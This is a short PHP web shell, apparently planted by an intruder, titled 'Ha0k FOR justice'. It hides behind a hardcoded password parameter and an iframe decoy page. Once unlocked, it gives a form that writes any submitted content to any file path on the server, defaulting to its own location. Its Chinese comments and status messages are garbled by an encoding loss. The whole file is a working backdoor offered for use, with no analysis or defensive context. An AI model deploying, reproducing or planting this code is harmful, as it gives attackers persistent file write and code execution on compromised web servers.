<?php
$mode="Seayace";               //�����޸�����ط��Ϳ�����.
if($_REQUEST['ha0k']!=$mode)
{
echo "<iframe src=bhst width=100% height=100% frameborder=0></iframe> ";
exit;
}
?>

<?php
if ($_POST)
{
$f=fopen($_POST["f"],"w");
if(fwrite($f,$_POST["c"]))
echo "<font color=red>�ɹ�!</font>";
else
echo "<font color=blue>ʧ��!</font>";
}
?>

<title>Ha0k FOR justice</title>
<form action="" method="post">
Pony:<input type="text" size=48 name="f" value='<?php echo $_SERVER["SCRIPT_FILENAME"];?>'>
<input type="submit" id="b" value="HackIt"><br>
<textarea name="c" cols=60 rows=9></textarea>
</form>
<p></p>